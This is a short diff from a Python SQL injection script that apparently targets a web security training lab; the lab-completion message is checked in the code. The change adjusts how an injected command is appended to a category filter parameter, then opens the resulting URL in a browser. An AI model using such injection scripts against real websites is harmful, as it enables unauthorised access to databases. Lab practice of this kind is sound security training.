@@ -44,7 +44,7 @@ def sqli(url, command):
         r = requests.get(url + path, params=params, verify=False)
         # verify the response contains Congratulations, you solved the lab!
         if (b'Congratulations, you solved the lab!' in r.content):
-            sqli_path = '/filter?category=Accessories=' + command 
+            sqli_path = '/filter?category=Accessories' + command 
             print("(+) SQL Injection Successful!")
             subprocess.call(["firefox", url + sqli_path])
         else:
